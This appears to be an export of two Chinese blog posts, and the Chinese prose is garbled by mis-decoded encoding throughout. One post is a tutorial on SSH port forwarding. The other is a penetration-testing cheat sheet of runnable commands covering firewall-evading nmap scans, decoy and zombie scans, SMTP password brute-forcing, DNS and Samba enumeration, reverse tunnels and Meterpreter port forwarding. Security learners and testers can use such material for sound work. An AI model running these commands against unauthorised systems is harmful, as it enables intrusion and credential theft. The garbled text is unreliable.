è¿™äº› TCP åº”ç”¨å‡èƒ½å¤Ÿä»ä¸­å¾—ç›Šï¼Œé¿å…äº†ç”¨æˆ·åï¼Œå¯†ç ä»¥åŠéšç§ä¿¡æ¯çš„æ˜æ–‡ä¼ è¾“ã€‚è€Œä¸æ­¤åŒæ—¶ï¼Œå¦‚æœæ‚¨å·¥ä½œç¯å¢ƒä¸­çš„é˜²ç«å¢™é™åˆ¶äº†ä¸€äº›ç½‘ç»œç«¯å£çš„ä½¿ç”¨ï¼Œä½†æ˜¯å…è®¸ SSH çš„è¿æ¥ï¼Œé‚£ä¹ˆä¹Ÿæ˜¯èƒ½å¤Ÿé€šè¿‡å°† TCP ç«¯å£è½¬å‘æ¥ä½¿ç”¨ SSH è¿›è¡Œé€šè®¯ã€‚</p><p>æ€»çš„æ¥è¯´ SSH ç«¯å£è½¬å‘èƒ½å¤Ÿæä¾›ä¸¤å¤§åŠŸèƒ½ï¼š</p><div class="note success"><ol><li>åŠ å¯† SSH Client ç«¯è‡³ SSH Server ç«¯ä¹‹é—´çš„é€šè®¯æ•°æ®ã€‚</li><li>çªç ´é˜²ç«å¢™çš„é™åˆ¶å®Œæˆä¸€äº›ä¹‹å‰æ— æ³•å»ºç«‹çš„ TCP è¿æ¥ã€‚</li></ol></div><h2 id="0x02-æœ¬åœ°è½¬å‘"><a href="#0x02-æœ¬åœ°è½¬å‘" class="headerlink" title="0x02 æœ¬åœ°è½¬å‘"></a>0x02 æœ¬åœ°è½¬å‘</h2><p><img src="https://kionf.com/article_images/network.png" alt="æœ¬åœ°è½¬å‘"></p><p>å¦‚å›¾,æˆ‘ä»¬å¯¹Bæœºå™¨æ²¡æœ‰æ“ä½œæƒé™ï¼ŒCæœºå™¨æ¬²è®¿é—®Bæœºå™¨ï¼Œä½†ç”±äºBæœºå™¨æ— å¤–ç½‘ipï¼Œæ‰€ä»¥æ— æ³•è®¿é—®ï¼Œä½†Aæœºå™¨å¯ä»¥å’ŒBï¼ŒCä¸¤å°æœºå™¨é€šä¿¡ï¼ˆæœ‰å¤–ç½‘ipå’Œå†…ç½‘ipï¼‰ï¼Œæ­¤æ—¶ä½¿ç”¨SSHåœ¨Aæœºå™¨ä¸ŠåšSSHç«¯å£æœ¬åœ°è½¬å‘ï¼Œæ¥å®ç°å¤–ç½‘è®¿é—®å†…ç½‘Bæœºå™¨</p><div class="note danger"><p>å¦‚æœè½¬å‘åç›‘å¬çš„ipåœ°å€ä¸º0.0.0.0ï¼Œåˆ™éœ€è¦æ›´æ”¹è·³æ¿æœºçš„sshdé…ç½®æ–‡ä»¶<code>vim /etc/ssh/sshd_config</code>æ›´æ”¹<code>GatewayPorts no</code> &gt; <code>GatewayPorts yes</code></p></div><p>åœ¨Aæœºå™¨æ‰§è¡Œï¼š</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">ssh -CfNgL 0.0.0.0:80:172.16.1.2:80 root@172.16.1.3</div><div class="line">     |     |       |     |              |</div><div class="line">     A     B       C     D              E</div></pre></div></div></figure><p>è¿™é‡Œæˆ‘ä»¬æ¥åˆ†æ®µè®²è§£å‘½ä»¤çš„æ„æˆï¼š</p><blockquote><p>Aï¼š è¿™é‡Œæ˜¯æœ¬æœºè½¬å‘åè¦ç›‘å¬çš„ipæ®µï¼Œ0.0.0.0å…è®¸æ‰€æœ‰ipè®¿é—®ï¼Œæœ¬æœºipå…è®¸å†…ç½‘ipè®¿é—®ï¼Œ127.0.0.1å…è®¸æœ¬æœºè®¿é—®<br>Bï¼šè¿œç¨‹ä¸»æœºç«¯å£è½¬å‘åˆ°æœ¬æœºåçš„ç«¯å£<br>Cï¼šè¦è½¬å‘çš„è¿œç¨‹ä¸»æœºipï¼Œè¿™é‡Œçš„ipåœ°å€æ˜¯ç›¸å¯¹è·³æ¿æœºè€Œè¨€çš„<br>Dï¼šè¦è½¬å‘çš„ç«¯å£<br>Eï¼šéœ€è¦æ‰§è¡Œè½¬å‘çš„æœºå™¨ï¼Œå³è·³æ¿æœº</p></blockquote><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line">-Cå‹ç¼©ä¼ è¾“æ•°æ®</div><div class="line">-få»ºç«‹SSHè¿æ¥åæ”¾ç½®åå°ï¼Œé™é»˜æ¨¡å¼</div><div class="line">-Nä¸è¦æ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚ è¿™å¯¹äºä»…è½¬å‘ç«¯å£å¾ˆæœ‰ç”¨ï¼ˆä»…é™åè®®ç‰ˆæœ¬2ï¼‰</div><div class="line">-gå…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°ç«¯å£è½¬å‘</div><div class="line">-LæŒ‡å®šæœ¬åœ°ï¼ˆå®¢æˆ·ç«¯ï¼‰ä¸»æœºä¸Šçš„ç»™å®šç«¯å£è¦è½¬å‘åˆ°è¿œç¨‹ç«¯çš„ç»™å®šä¸»æœºå’Œç«¯å£ã€‚è¿™é€šè¿‡åˆ†é…ä¸€ä¸ªå¥—æ¥å­—ä¾¦å¬æœ¬åœ°ç«¯å£ï¼Œ</div><div class="line">å¯é€‰ç»‘å®šåˆ°æŒ‡å®šçš„bind_addresså·¥ä½œã€‚æ¯å½“ä¸æ­¤ç«¯å£å»ºç«‹è¿æ¥æ—¶ï¼Œéƒ½ä¼šé€šè¿‡å®‰å…¨é€šé“è½¬å‘è¿æ¥ï¼Œ</div><div class="line">å¹¶ä»è¿œç¨‹æœºå™¨è¿æ¥åˆ°ä¸»æœºç«¯å£ä¸»æœºç«¯å£            # è®°ä½æœ¬åœ°è½¬å‘æ—¶å€™ç”¨Lé€‰é¡¹å°±å¯ä»¥äº†</div></pre></div></div></figure><p>è®¿é—®æµç¨‹å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">Client(C)    è®¿é—®TCP&gt;    A:80    é€šè¿‡SSHéš§é“&gt;    SSH(A)    TCP&gt;    B:80</div></pre></div></div></figure><blockquote><p>è¿™é‡Œåšçš„æ˜¯åœ¨Aä¸»æœºæœ¬åœ°çš„ç«¯å£è½¬å‘ï¼Œå¦‚æœæƒ³æŠŠBæœºå™¨80ç«¯å£è½¬å‘åˆ°åœ¨Cæœºå™¨çš„80ç«¯å£</p></blockquote><p>åœ¨Cæœºå™¨æ‰§è¡Œï¼š</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#ssh -CfNgL 0.0.0.0:80:172.16.1.2:80 root@172.16.1.3</span></div><div class="line">ssh -CfNgL 0.0.0.0:80:172.16.1.2:80 root@123.56.1.23</div><div class="line">åªéœ€è¦æŠŠæ­¤ipï¼Œæ›´æ¢æˆAæœºå™¨å¤–ç½‘ipå³å¯</div><div class="line"><span class="comment">#sshç™»é™†Aä¸»æœºï¼Œå‘Šè¯‰Aä¸»æœºï¼Œè½¬å‘Bä¸»æœºï¼ˆ172.16.1.2ï¼‰80ç«¯å£ï¼Œæœ¬æœºSSHä¸Aä¸»æœºå»ºç«‹SSHéš§é“è½¬å‘åˆ°æœ¬æœº80ç«¯å£</span></div><div class="line"><span class="comment">#æ­¤æ—¶åœ¨Aä¸»æœºæ‰§è¡Œnetstat -anp|grep sshä¼šå¤šå‡ºæ¥ä¸€æ¡SSHéš§é“è¿›ç¨‹ï¼Œè¿™ä¸ªéš§é“å°±æ˜¯ä¸Cä¸»æœºå»ºç«‹çš„</span></div></pre></div></div></figure><p>è®¿é—®æµç¨‹å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">Client(C)    TCP&gt;    C:80    é€šè¿‡SSHéš§é“&gt;    SSH(A)    TCP&gt;    B:80</div></pre></div></div></figure><div class="note danger"><p>å»ºè®®äº²æ‰‹æ“ä½œå»è¯•è¯•æ‰¾ä¸‹æ„Ÿè§‰ï¼</p></div><h2 id="0x03-è¿œç¨‹è½¬å‘"><a href="#0x03-è¿œç¨‹è½¬å‘" class="headerlink" title="0x03 è¿œç¨‹è½¬å‘"></a>0x03 è¿œç¨‹è½¬å‘</h2><p><img src="https://kionf.com/article_images/network2.png" alt="è¿œç¨‹è½¬å‘"></p><p>å¦‚å›¾ï¼ŒåŒæ ·æˆ‘ä»¬å¯¹Cæœºå™¨æ²¡æœ‰æ“ä½œæƒé™ï¼ŒDæœºå™¨æƒ³è®¿é—®Cæœºå™¨80ç«¯å£ï¼Œä½†æ˜¯å’ŒCåŒä¸€ç½‘æ®µçš„æœºå™¨éƒ½æ²¡æœ‰å¤–ç½‘ipï¼Œåªæœ‰Aæœºå™¨æœ‰å¤–ç½‘ä½†å’ŒCåˆä¸æ˜¯ä¸€ä¸ªå±€åŸŸç½‘ï¼Œä¸ŠèŠ‚æˆ‘ä»¬ç”¨çš„æœ¬åœ°ç«¯å£è½¬å‘åœ¨è¿™é‡Œå°±ä¸èƒ½ä½¿ç”¨äº†ï¼Œæ­¤æ—¶è¿œç¨‹ç«¯å£è½¬å‘å‡ºæ¥äº†: )</p><p>åœ¨Bæœºå™¨æ‰§è¡Œï¼š</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">éœ€è¦è½¬å‘ä¸»æœºçš„ip(C)</div><div class="line">        |</div><div class="line">ssh -CNfgR 0.0.0.0:80:172.16.1.2:80 root@123.56.2.3</div><div class="line">    |      |              |            |</div><div class="line">è¿œç¨‹ä¸»æœºç›‘å¬ç½‘æ®µ è¿œç¨‹ä¸»æœºç›‘å¬ç«¯å£   è½¬å‘ç«¯å£     è¿œç¨‹ä¸»æœº(A)</div></pre></div></div></figure><p>æ‰§è¡Œå¦‚ä¸Šæ“ä½œï¼Œæ­¤æ—¶Dè®¿é—®Aä¸»æœº80ç«¯å£å°±å¯ä»¥è½¬å‘åˆ°Cä¸»æœº80ç«¯å£<code>Bä¸»æœºæ‰®æ¼”è·³æ¿æœºè§’è‰²</code></p><p>è®¿é—®æµç¨‹å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">Client(D)    TCP&gt;    A:80    SSHéš§é“&gt;    B    TCP&gt;    C:80</div><div class="line">#æœ‰ç§å–é˜Ÿå‹çš„æ„Ÿè§‰ï¼šï¼‰</div></pre></div></div></figure><h2 id="0x04-åŠ¨æ€ç«¯å£è½¬å‘"><a href="#0x04-åŠ¨æ€ç«¯å£è½¬å‘" class="headerlink" title="0x04 åŠ¨æ€ç«¯å£è½¬å‘"></a>0x04 åŠ¨æ€ç«¯å£è½¬å‘</h2><p>æ­¤æ–¹æ³•å¤šç”¨äºç¿»å¢™ï¼Œæ‰€æœ‰ç«¯å£ç»è¿‡SSHéš§é“ï¼Œå»ºç«‹socksè¿æ¥ï¼Œä¸€æ¡å‘½ä»¤è‡ªå·±ä½“ä¼š</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">ssh  -qTfnN -D 7070 servername@serverIP  -p sshport</div></pre></div></div></figure>]]></content>
      
      <categories>
          
          <category> SSH </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Foward </tag>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æ¸—é€å·¥å…·å®æˆ˜åº”ç”¨å‘½ä»¤åˆé›†</title>
      <link href="/2016/12/30/kali-tools/"/>
      <url>/2016/12/30/kali-tools/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>æœ¬æ–‡ä¸ºå›½å¤–å¤§ç‰›æ€»ç»“è‡ªå·±åœ¨æ¸—é€æµ‹è¯•ä¸­å¸¸ç”¨çš„ä¸€äº›å°æŠ€å·§ã€‚åŸæ–‡åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œè¿™é‡Œç¿»è¯‘å¹¶ä¸”æ€»ç»“ï¼Œæ–¹ä¾¿æŸ¥é˜…ã€‚</p></blockquote><a id="more"></a><h2 id="NMAP-æ‰«æç­–ç•¥"><a href="#NMAP-æ‰«æç­–ç•¥" class="headerlink" title="NMAP æ‰«æç­–ç•¥"></a>NMAP æ‰«æç­–ç•¥</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></div><div class="code"><pre><div class="line"># é€‚ç”¨æ‰€æœ‰å¤§å°ç½‘ç»œæœ€å¥½çš„ nmap æ‰«æç­–ç•¥</div><div class="line"></div><div class="line"># ä¸»æœºå‘ç°ï¼Œç”Ÿæˆå­˜æ´»ä¸»æœºåˆ—è¡¨</div><div class="line">$ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24</div><div class="line">$ grep &quot;Status: Up&quot; Discovery.gnmap | cut -f 2 -d &apos; &apos; &gt; LiveHosts.txt</div><div class="line"></div><div class="line"># ç«¯å£å‘ç°ï¼Œå‘ç°å¤§éƒ¨åˆ†å¸¸ç”¨ç«¯å£</div><div class="line"># http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf</div><div class="line">$ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt</div><div class="line">$ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt</div><div class="line">$ nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt</div><div class="line"></div><div class="line"># ç«¯å£å‘ç°ï¼Œå‘ç°å…¨éƒ¨ç«¯å£ï¼Œä½† UDP ç«¯å£çš„æ‰«æä¼šéå¸¸æ…¢</div><div class="line">$ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt</div><div class="line">$ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt</div><div class="line"></div><div class="line"># æ˜¾ç¤º TCP\UDP ç«¯å£</div><div class="line">$ grep &quot;open&quot; FullTCP|cut -f 1 -d &apos; &apos; | sort -nu | cut -f 1 -d &apos;/&apos; |xargs | sed &apos;s/ /,/g&apos;|awk &apos;&#123;print &quot;T:&quot;$0&#125;&apos;</div><div class="line">$ grep &quot;open&quot; FullUDP|cut -f 1 -d &apos; &apos; | sort -nu | cut -f 1 -d &apos;/&apos; |xargs | sed &apos;s/ /,/g&apos;|awk &apos;&#123;print &quot;U:&quot;$0&#125;&apos;</div><div class="line"></div><div class="line"># ä¾¦æµ‹æœåŠ¡ç‰ˆæœ¬</div><div class="line">$ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt</div><div class="line"></div><div class="line"># æ‰«åšç³»ç»Ÿæ‰«æ</div><div class="line">$ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt</div><div class="line"></div><div class="line"># ç³»ç»Ÿå’ŒæœåŠ¡æ£€æµ‹</div><div class="line">$ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt</div></pre></div></div></figure><h2 id="Nmap-â€“-èº²é¿é˜²ç«å¢™"><a href="#Nmap-â€“-èº²é¿é˜²ç«å¢™" class="headerlink" title="Nmap â€“ èº²é¿é˜²ç«å¢™"></a>Nmap â€“ èº²é¿é˜²ç«å¢™</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></div><div class="code"><pre><div class="line"># åˆ†æ®µ</div><div class="line">$ nmap -f</div><div class="line"></div><div class="line"># ä¿®æ”¹é»˜è®¤ MTU å¤§å°ï¼Œä½†å¿…é¡»ä¸º 8 çš„å€æ•°(8,16,24,32 ç­‰ç­‰)</div><div class="line">$ nmap --mtu 24</div><div class="line"></div><div class="line"># ç”Ÿæˆéšæœºæ•°é‡çš„æ¬ºéª—</div><div class="line">$ nmap -D RND:10 [target]</div><div class="line"></div><div class="line"># æ‰‹åŠ¨æŒ‡å®šæ¬ºéª—ä½¿ç”¨çš„ IP</div><div class="line">$ nmap -D decoy1,decoy2,decoy3 etc.</div><div class="line"></div><div class="line"># åƒµå°¸ç½‘ç»œæ‰«æ, é¦–å…ˆéœ€è¦æ‰¾åˆ°åƒµå°¸ç½‘ç»œçš„IP</div><div class="line">$ nmap -sI [Zombie IP] [Target IP]</div><div class="line"></div><div class="line"># æŒ‡å®šæºç«¯å£å·</div><div class="line">$ nmap --source-port 80 IP</div><div class="line"></div><div class="line"># åœ¨æ¯ä¸ªæ‰«ææ•°æ®åŒ…åè¿½åŠ éšæœºæ•°é‡çš„æ•°æ®</div><div class="line">$ nmap --data-length 25 IP</div><div class="line"></div><div class="line"># MAC åœ°å€æ¬ºéª—ï¼Œå¯ä»¥ç”Ÿæˆä¸åŒä¸»æœºçš„ MAC åœ°å€</div><div class="line">$ nmap --spoof-mac Dell/Apple/3Com IP</div></pre></div></div></figure><h2 id="Nmap-è¿›è¡Œ-Web-æ¼æ´æ‰«æ"><a href="#Nmap-è¿›è¡Œ-Web-æ¼æ´æ‰«æ" class="headerlink" title="Nmap è¿›è¡Œ Web æ¼æ´æ‰«æ"></a>Nmap è¿›è¡Œ Web æ¼æ´æ‰«æ</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></div><div class="code"><pre><div class="line">cd /usr/share/nmap/scripts/</div><div class="line">wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gz</div><div class="line">nmap -sS -sV --script=vulscan/vulscan.nse target</div><div class="line">nmap -sS -sV --script=vulscan/vulscan.nse â€“script-args vulscandb=scipvuldb.csv target</div><div class="line">nmap -sS -sV --script=vulscan/vulscan.nse â€“script-args vulscandb=scipvuldb.csv -p80 target</div><div class="line">nmap -PN -sS -sV --script=vulscan â€“script-args vulscancorrelation=1 -p80 target</div><div class="line">nmap -sV --script=vuln target</div><div class="line">nmap -PN -sS -sV --script=all â€“script-args vulscancorrelation=1 target</div></pre></div></div></figure><h2 id="ä½¿ç”¨-DIRB-çˆ†ç ´ç›®å½•"><a href="#ä½¿ç”¨-DIRB-çˆ†ç ´ç›®å½•" class="headerlink" title="ä½¿ç”¨ DIRB çˆ†ç ´ç›®å½•"></a>ä½¿ç”¨ DIRB çˆ†ç ´ç›®å½•</h2><p><code>DIRB æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨äºçˆ†ç ´ç›®å½•çš„å·¥å…·ï¼Œåœ¨ Kali ä¸­é»˜è®¤å·²ç»å®‰è£…</code></p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt</div></pre></div></div></figure><h2 id="Patator-â€“-å…¨èƒ½æš´åŠ›ç ´è§£æµ‹è¯•å·¥å…·"><a href="#Patator-â€“-å…¨èƒ½æš´åŠ›ç ´è§£æµ‹è¯•å·¥å…·" class="headerlink" title="Patator â€“ å…¨èƒ½æš´åŠ›ç ´è§£æµ‹è¯•å·¥å…·"></a>Patator â€“ å…¨èƒ½æš´åŠ›ç ´è§£æµ‹è¯•å·¥å…·</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line"># git clone https://github.com/lanjelot/patator.git /usr/share/patator</div><div class="line"></div><div class="line"># SMTP çˆ†ç ´</div><div class="line">$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst</div><div class="line">$ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst</div><div class="line">$ patator smtp_login host=192.168.17.129 helo=&apos;ehlo 192.168.17.128&apos; user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst</div><div class="line">$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=&apos;incorrect password or account name&apos;</div></pre></div></div></figure><h2 id="ä½¿ç”¨-Fierce-çˆ†ç ´-DNS"><a href="#ä½¿ç”¨-Fierce-çˆ†ç ´-DNS" class="headerlink" title="ä½¿ç”¨ Fierce çˆ†ç ´ DNS"></a>ä½¿ç”¨ Fierce çˆ†ç ´ DNS</h2><blockquote><p>æ³¨ï¼šFierce ä¼šæ£€æŸ¥ DNS æœåŠ¡å™¨æ˜¯å¦å…è®¸åŒºåŸŸä¼ é€ã€‚å¦‚æœå…è®¸ï¼Œå°±ä¼šè¿›è¡ŒåŒºåŸŸä¼ é€å¹¶é€šçŸ¥ç”¨æˆ·ï¼Œå¦‚æœä¸å…è®¸ï¼Œåˆ™å¯ä»¥é€šè¿‡æŸ¥è¯¢ DNS æœåŠ¡å™¨æšä¸¾ä¸»æœºåã€‚ç±»ä¼¼å·¥å…·ï¼šsubDomainsBrute å’Œ SubBrute ç­‰ç­‰</p></blockquote><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"># http://ha.ckers.org/fierce/</div><div class="line">$ ./fierce.pl -dns example.com</div><div class="line">$ ./fierce.pl â€“dns example.com â€“wordlist myWordList.txt</div></pre></div></div></figure><h2 id="ä½¿ç”¨-Nikto-æ‰«æ-Web-æœåŠ¡"><a href="#ä½¿ç”¨-Nikto-æ‰«æ-Web-æœåŠ¡" class="headerlink" title="ä½¿ç”¨ Nikto æ‰«æ Web æœåŠ¡"></a>ä½¿ç”¨ Nikto æ‰«æ Web æœåŠ¡</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">nikto -C all -h http://IP</div></pre></div></div></figure><h2 id="æ‰«æ-WordPress"><a href="#æ‰«æ-WordPress" class="headerlink" title="æ‰«æ WordPress"></a>æ‰«æ WordPress</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">git clone https://github.com/wpscanteam/wpscan.git &amp;&amp; cd wpscan</div><div class="line">./wpscan â€“url http://IP/ â€“enumerate p</div></pre></div></div></figure><h2 id="HTTP-æŒ‡çº¹è¯†åˆ«"><a href="#HTTP-æŒ‡çº¹è¯†åˆ«" class="headerlink" title="HTTP æŒ‡çº¹è¯†åˆ«"></a>HTTP æŒ‡çº¹è¯†åˆ«</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">wget http://www.net-square.com/_assets/httprint_linux_301.zip &amp;&amp; unzip httprint_linux_301.zip</div><div class="line">cd httprint_301/linux/</div><div class="line">./httprint -h http://IP -s signatures.txt</div><div class="line">ä½¿ç”¨ Skipfish æ‰«æ</div><div class="line">æ³¨ï¼šSkipfish æ˜¯ä¸€æ¬¾ Web åº”ç”¨å®‰å…¨ä¾¦æŸ¥å·¥å…·ï¼ŒSkipfish ä¼šåˆ©ç”¨é€’å½’çˆ¬è™«å’ŒåŸºäºå­—å…¸çš„æ¢é’ˆç”Ÿæˆä¸€å¹…äº¤äº’å¼ç½‘ç«™åœ°å›¾ï¼Œæœ€ç»ˆç”Ÿæˆçš„åœ°å›¾ä¼šåœ¨é€šè¿‡å®‰å…¨æ£€æŸ¥åè¾“å‡ºã€‚</div></pre></div></div></figure><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP</div></pre></div></div></figure><h2 id="ä½¿ç”¨-NC-æ‰«æ"><a href="#ä½¿ç”¨-NC-æ‰«æ" class="headerlink" title="ä½¿ç”¨ NC æ‰«æ"></a>ä½¿ç”¨ NC æ‰«æ</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">nc -v -w 1 target -z 1-1000</div><div class="line">for i in &#123;101..102&#125;; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done</div><div class="line"></div><div class="line">#åˆ¤æ–­ç«¯å£æ˜¯å¦å¼€å¯</div><div class="line">nc -v5 -w target port</div></pre></div></div></figure><h2 id="Unicornscan"><a href="#Unicornscan" class="headerlink" title="Unicornscan"></a>Unicornscan</h2><blockquote><p>æ³¨ï¼šUnicornscan æ˜¯ä¸€ä¸ªä¿¡æ¯æ”¶é›†å’Œå®‰å…¨å®¡è®¡çš„å·¥å…·ã€‚</p></blockquote><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">us -H -msf -Iv 192.168.56.101 -p 1-65535</div><div class="line">us -H -mU -Iv 192.168.56.101 -p 1-65535</div><div class="line"></div><div class="line">-H åœ¨ç”ŸæˆæŠ¥å‘Šé˜¶æ®µè§£æä¸»æœºå</div><div class="line">-m æ‰«æç±»å‹ (sf - tcp, U - udp)</div><div class="line">-Iv - è¯¦ç»†</div></pre></div></div></figure><h2 id="ä½¿ç”¨-Xprobe2-è¯†åˆ«æ“ä½œç³»ç»ŸæŒ‡çº¹"><a href="#ä½¿ç”¨-Xprobe2-è¯†åˆ«æ“ä½œç³»ç»ŸæŒ‡çº¹" class="headerlink" title="ä½¿ç”¨ Xprobe2 è¯†åˆ«æ“ä½œç³»ç»ŸæŒ‡çº¹"></a>ä½¿ç”¨ Xprobe2 è¯†åˆ«æ“ä½œç³»ç»ŸæŒ‡çº¹</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">xprobe2 -v -p tcp:80:open IP</div></pre></div></div></figure><h2 id="æšä¸¾-Samba"><a href="#æšä¸¾-Samba" class="headerlink" title="æšä¸¾ Samba"></a>æšä¸¾ Samba</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">nmblookup -A target</div><div class="line">smbclient //MOUNT/share -I target -N</div><div class="line">rpcclient -U &quot;&quot; target</div><div class="line">enum4linux target</div></pre></div></div></figure><h2 id="æšä¸¾-SNMP"><a href="#æšä¸¾-SNMP" class="headerlink" title="æšä¸¾ SNMP"></a>æšä¸¾ SNMP</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">snmpget -v 1 -c public IP</div><div class="line">snmpwalk -v 1 -c public IP</div><div class="line">snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP</div></pre></div></div></figure><h2 id="PuTTY-è¿æ¥éš§é“"><a href="#PuTTY-è¿æ¥éš§é“" class="headerlink" title="PuTTY è¿æ¥éš§é“"></a>PuTTY è¿æ¥éš§é“</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">è½¬å‘è¿œç¨‹ç«¯å£åˆ°ç›®æ ‡åœ°å€</div><div class="line">plink.exe -P 22 -l root -pw &quot;1234&quot; -R 445:127.0.0.1:445 IP</div></pre></div></div></figure><h2 id="Meterpreter-ç«¯å£è½¬å‘"><a href="#Meterpreter-ç«¯å£è½¬å‘" class="headerlink" title="Meterpreter ç«¯å£è½¬å‘"></a>Meterpreter ç«¯å£è½¬å‘</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"># è½¬å‘è¿œç¨‹ç«¯å£åˆ°ç›®æ ‡åœ°å€</div><div class="line">meterpreter &gt; portfwd add â€“l 3389 â€“p 3389 â€“r 172.16.194.141</div><div class="line">kali &gt; rdesktop 127.0.0.1:3389</div></pre></div></div></figure><h2 id="SSH-ç©¿é€"><a href="#SSH-ç©¿é€" 